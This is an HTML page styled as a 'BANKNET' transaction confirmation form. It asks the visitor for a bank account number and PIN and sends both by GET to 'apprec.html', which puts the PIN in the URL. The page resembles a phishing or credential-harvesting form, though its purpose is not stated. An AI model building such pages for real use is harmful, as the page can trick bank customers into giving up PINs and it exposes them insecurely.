<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANKNET Transaction Confirmation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        h2 {
            color: #333;
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            text-align: left;
            margin-bottom: 10px;
            color: #555;
        }

        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .btn {
            background-color: #4CAF50;
            color: #ffffff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #4CAF50;
        }

        .btn-cancel {
            background-color: #4CAF50;
        }

        .btn-cancel:hover {
            background-color: #4CAF50;
        }

        .message {
            color: #555;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Confirm Your Transaction</h2>
        <form action="apprec.html" method="get">
            <label for="account-number">Confirm Bank Account Number</label>
            <input type="text" id="account-number" name="account-number" placeholder="Enter your account number" required>

            <label for="pin">Confirm PIN</label>
            <input type="password" id="pin" name="pin" placeholder="Enter your PIN" required>

            <button type="submit" class="btn">Confirm Transaction</button>
            <button type="button" class="btn btn-cancel">Cancel</button>
        </form>
        <p class="message">Please ensure your details are correct before confirming the transaction.</p>
    </div>

</body>
</html>
